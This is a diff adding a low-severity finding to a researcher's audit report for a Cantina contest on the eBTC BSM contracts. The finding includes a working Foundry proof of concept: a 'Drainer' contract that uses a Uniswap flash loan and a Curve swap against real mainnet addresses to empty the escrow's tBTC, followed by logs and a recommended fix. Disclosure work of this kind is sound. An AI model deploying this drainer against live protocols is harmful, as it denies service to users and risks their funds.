@@ -4,7 +4,7 @@
 **Contest:** [badger-ebtc-bsm](https://cantina.xyz/competitions/f57ffb47-0ded-4f04-bcec-ecd7d47fad58)  
 **Dates:** March 6, 2025 - March 13, 2025   
 **Role:** Independent Security Researcher  
-**Findings:** 2 High, 1 Medium, 1 Low
+**Findings:** 2 High, 1 Medium, 2 Low
 
 ---
 
@@ -619,3 +619,343 @@ Loss to the attacker in TBTC: 8174420159625838
 Consider using a time-weighted average value of the total amount minted by the BSM, rather than just the current value. This could help to smooth out the impact of large mints.
 
 **Submission details:** https://cantina.xyz/code/f57ffb47-0ded-4f04-bcec-ecd7d47fad58/findings/518
+
+### L-02: Lack of constraints on burned amount allows for liquidity to be drained from BSM
+
+Please note: the PoC has been slightly modified from the original submission to demonstrate a more cost-effective attack path.
+
+#### Description and impact
+The `EbtcBSM` contract places no restrictions on the amount of eBTC burned, allowing an attacker to sabotage the protocol through purchasing a large quantity of eBTC and calling `EbtcBSM::buyAsse`, draining all or most of the available assets held by the escrow.
+
+The impact is a temporary DoS for users seeking to buy assets from the BSM. It causes disruption without leading to direct loss of funds. There would also likely be loss of user confidence in the protocol.
+
+It is highly likely to cause a loss to the attacker, but based on the below PoC the loss may not be so large to ward off a highly motivated attacker. If there is higher available liquidity of eBTC and the asset token, they may incur less slippage when using the uniswap pools. Additionally, they could exploit a scenario where asset token depegs upwards and are able to sell the withdrawn asset token amount at a higher price, thus making up for these losses or even making a profit.
+
+I initially submitted this issue as medium severity however it was downgraded to low. I understand the judges point of view, as it is unlikley to occur
+unless there is an arbitrage opportunity for the attacker (so they can profit) or the attacker is willing to make a loss in exchange for causing DoS.
+
+#### Proof of Concept
+The below proof of concept simulates the effect of an attack using actual mainnet Uniswap pools. Firstly, modify the `setUp` function of `BSMTestBase` to use the fork. Since we use the actual eBTC mainnet contract, we mock the call to Authority `canCall` function for ease of setting up the test.
+
+```solidity
+import "../src/Dependencies/RolesAuthority.sol";
+
+    function setUp() public virtual {
+        string memory rpcUrl = vm.envString("RPC_URL");
+        uint256 forkId = vm.createFork(rpcUrl);
+        vm.selectFork(forkId);
+        vm.rollFork(22028386);
+
+        vm.mockCall(
+            address(0x2A095d44831C26cFB6aCb806A6531AE3CA32DBc1), // mainnet authority contract
+            abi.encodeWithSelector(RolesAuthority.canCall.selector),
+            abi.encode(true)
+        );
+
+        BSMBase.baseSetup();
+    }
+```
+
+Secondly, modify the `BSMBase` contract `baseSetup` function:
+
+```solidity
+    function baseSetup() internal virtual {
+        defaultGovernance = vm.addr(0x123456);
+        defaultFeeRecipient = vm.addr(0x234567);
+        authority = Governor(0x2A095d44831C26cFB6aCb806A6531AE3CA32DBc1); // mainnet authority
+
+        mockAssetToken = ERC20Mock(0x18084fbA666a33d37592fA2633fD49a74DD93a88); // tBTC
+        mockEbtcToken = ERC20Mock(address(0x661c70333AA1850CcDBAe82776Bb436A0fCfeEfB));
+        mockActivePoolObserver = new MockActivePoolObserver(mockEbtcToken);
+        externalVault = new ERC4626Mock(address(mockAssetToken));
+        mockAssetOracle = new MockAssetOracle(18);
+        oraclePriceConstraint = new OraclePriceConstraint(
+            address(mockAssetOracle),
+            address(authority)
+        );
+        rateLimitingConstraint = new RateLimitingConstraint(
+            address(mockActivePoolObserver),
+            address(authority)
+        );
+        testMinter = vm.addr(0x11111);
+        testBuyer = vm.addr(0x22222);
+        testAuthorizedUser = vm.addr(0x33333);
+        techOpsMultisig = 0x690C74AF48BE029e763E61b4aDeB10E06119D3ba;
+
+        bsmTester = new EbtcBSM(
+            address(mockAssetToken),
+            address(oraclePriceConstraint),
+            address(rateLimitingConstraint),
+            address(mockEbtcToken),
+            address(authority)
+        );
+
+        escrow = new ERC4626Escrow(
+            address(externalVault),
+            address(mockAssetToken),
+            address(bsmTester),
+            address(authority),
+            address(defaultFeeRecipient)
+        );
+        
+        bsmTester.initialize(address(escrow));
+
+        // create initial ebtc supply
+        mockEbtcToken.mint(defaultGovernance, 50e18);
+        mockAssetOracle.setPrice(1e18);
+        mockAssetOracle.setUpdateTime(block.timestamp);
+
+        vm.prank(testMinter);
+        mockAssetToken.approve(address(bsmTester), type(uint256).max);
+
+        vm.prank(testAuthorizedUser);
+        mockAssetToken.approve(address(bsmTester), type(uint256).max);
+        vm.prank(testAuthorizedUser);
+        mockEbtcToken.approve(address(bsmTester), type(uint256).max);
+
+        mockEbtcToken.mint(testAuthorizedUser, 10e18);
+
+        mockEbtcToken.mint(testBuyer, 10e18);
+
+        // give eBTC minter and burner roles to BSM tester
+        setUserRole(address(bsmTester), 1, true);
+        setUserRole(address(bsmTester), 2, true);
+        setRoleName(15, "BSM: Governance");
+        setRoleName(16, "BSM: AuthorizedUser");
+        setRoleCapability(
+            15,
+            address(bsmTester),
+            bsmTester.setFeeToBuy.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(bsmTester),
+            bsmTester.setFeeToSell.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(bsmTester),
+            bsmTester.updateEscrow.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(bsmTester),
+            bsmTester.pause.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(bsmTester),
+            bsmTester.unpause.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(bsmTester),
+            bsmTester.setOraclePriceConstraint.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(bsmTester),
+            bsmTester.setRateLimitingConstraint.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(escrow),
+            escrow.claimProfit.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(escrow),
+            escrow.depositToExternalVault.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(escrow),
+            escrow.redeemFromExternalVault.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(oraclePriceConstraint),
+            oraclePriceConstraint.setMinPrice.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(oraclePriceConstraint),
+            oraclePriceConstraint.setOracleFreshness.selector,
+            true
+        );
+        setRoleCapability(
+            15,
+            address(rateLimitingConstraint),
+            rateLimitingConstraint.setMintingConfig.selector,
+            true
+        );
+        // Give ebtc tech ops role 15
+        setUserRole(techOpsMultisig, 15, true);
+        setRoleCapability(
+            16,
+            address(bsmTester),
+            bsmTester.sellAssetNoFee.selector,
+            true
+        );
+        setRoleCapability(
+            16,
+            address(bsmTester),
+            bsmTester.buyAssetNoFee.selector,
+            true
+        );
+        // Give authorizedUser role 16
+        setUserRole(testAuthorizedUser, 16, true);
+
+        // Set minting cap to 10%
+        vm.prank(techOpsMultisig);
+        rateLimitingConstraint.setMintingConfig(address(bsmTester), RateLimitingConstraint.MintingConfig(1000, 0, false));
+    }
+```
+
+Finally, add a new solidity file into the test directory with the below source code:
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.25;
+
+import "./BSMTestBase.sol";
+import {IEbtcBSM} from "../src/Dependencies/IEbtcBSM.sol";
+
+interface ISwapRouter {
+    struct ExactInputSingleParams {
+        address tokenIn;
+        address tokenOut;
+        uint24 fee;
+        address recipient;
+        uint256 deadline;
+        uint256 amountIn;
+        uint256 amountOutMinimum;
+        uint160 sqrtPriceLimitX96;
+    }
+
+    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
+}
+
+interface IUniswapV3Pool {
+    function flash(
+        address recipient,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external;
+}
+
+interface ICurvePool {
+    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
+}
+
+contract Drainer {
+    ISwapRouter private constant UNISWAP_V3_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    ICurvePool public constant EBTC_TBTC_CURVE_POOL = ICurvePool(0x272BF7e4Ce3308B1Fb5e54d6a1Fc32113619c401);
+    address private constant EBTC = 0x661c70333AA1850CcDBAe82776Bb436A0fCfeEfB;
+    address private constant TBTC = 0x18084fbA666a33d37592fA2633fD49a74DD93a88;
+    address private constant WBTC_EBTC_UNISWAP_POOL = 0xEf9b4FddD861aa2F00eE039C323b7FAbd7AFE239;
+
+    IEbtcBSM private immutable bsm;
+    address private attackerWallet;
+
+    constructor(address _bsm) {
+        bsm = IEbtcBSM(_bsm);
+        IERC20(EBTC).approve(address(bsm), type(uint256).max);
+        IERC20(TBTC).approve(address(EBTC_TBTC_CURVE_POOL), type(uint256).max);
+    }
+
+    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
+        require(msg.sender == WBTC_EBTC_UNISWAP_POOL);
+
+        uint256 ebtcReceived = abi.decode(data, (uint256));
+
+        // Use the eBTC to buy tBTC through the BSM
+        uint256 tbtcReceived = bsm.buyAsset(ebtcReceived, address(this), 0); // Slippage protection could be added
+
+        // Exchange the tBTC back to eBTC using Curve pool (we can't use uniswap again due to reentrancy restrictions)
+        uint256 ebtcReceivedFromSwap = EBTC_TBTC_CURVE_POOL.exchange(1, 0, tbtcReceived, 0);
+
+        // Attacker pays the fee
+        IERC20(EBTC).transferFrom(attackerWallet, msg.sender, ebtcReceived + fee1 - ebtcReceivedFromSwap);
+
+        // Repay the remaining owed amount
+        IERC20(EBTC).transfer(msg.sender, ebtcReceivedFromSwap);
+
+        delete attackerWallet;
+    }
+
+    // Use a flash loan of the given amount of eBTC to drain tBTC from the protocol
+    function drain(
+        uint256 amount
+    ) public {
+        attackerWallet = msg.sender;
+        IUniswapV3Pool(WBTC_EBTC_UNISWAP_POOL).flash(address(this), 0, amount, abi.encode(amount));
+    }
+}
+
+contract AttackTest is BSMTestBase {
+    function testBuyAssetLiquidityDrain() public {
+        // Assets are initially sold to the protocol
+        address alice = makeAddr("alice");
+        deal(address(mockAssetToken), alice, 10e18);
+        vm.startPrank(alice);
+        mockAssetToken.approve(address(bsmTester), type(uint256).max);
+        bsmTester.sellAsset(5e18, alice, 0);
+        vm.stopPrank();
+
+        emit log_named_uint("Initial tBTC balance of escrow", mockAssetToken.balanceOf(address(escrow)));
+
+        // Deploy the attack contract
+        Drainer drainer = new Drainer(address(bsmTester));
+        address ebtc = 0x661c70333AA1850CcDBAe82776Bb436A0fCfeEfB;
+        IERC20(ebtc).approve(address(drainer), type(uint256).max);
+
+        // The attacker needs some initial amount of eBTC to pay for fees
+        uint256 initEbtcBalance = 1e18;
+        deal(ebtc, address(this), initEbtcBalance);
+        assertEq(IERC20(ebtc).balanceOf(address(this)), initEbtcBalance);
+        drainer.drain(mockAssetToken.balanceOf(address(escrow)));
+
+        emit log_named_uint("Final tBTC balance of escrow", mockAssetToken.balanceOf(address(escrow)));
+        emit log_named_uint("eBTC loss to the attacker", initEbtcBalance - IERC20(ebtc).balanceOf(address(this)));
+
+        // Users can no longer buy assets
+        vm.startPrank(alice);
+        vm.expectPartialRevert(EbtcBSM.InsufficientAssetTokens.selector);
+        bsmTester.buyAsset(0.01e18, alice, 0);
+    }
+}
+```
+
+You can run the test by exporting your RPC_URL as environment variable (ethereum mainnet), and then run using:
+
+```
+forge test --match-test testBuyAssetLiquidityDrain -vvv
+```
+
+The test produces the below logs:
+
+```
+  Initial tBTC balance of escrow: 5000000000000000000
+  Final TBTC balance of escrow: 0
+  eBTC loss to the attacker: 15330887332317798
+```
+
+This costs the attacker approximately 0.015 eBTC to drain 5 tBTC from the protocol.
+
+#### Recommendation
+Consider measuring the total amount of asset token withdrawn from the BSM over a rolling time window. If the value is too high in comparison to the current total amount of asset tokens available, then the `buyAsset` function could revert. This would require careful tuning of threshold parameters to determine at what point `buyAsset` should revert.
+
+**Submission details:** xxxxxxxxxxxx
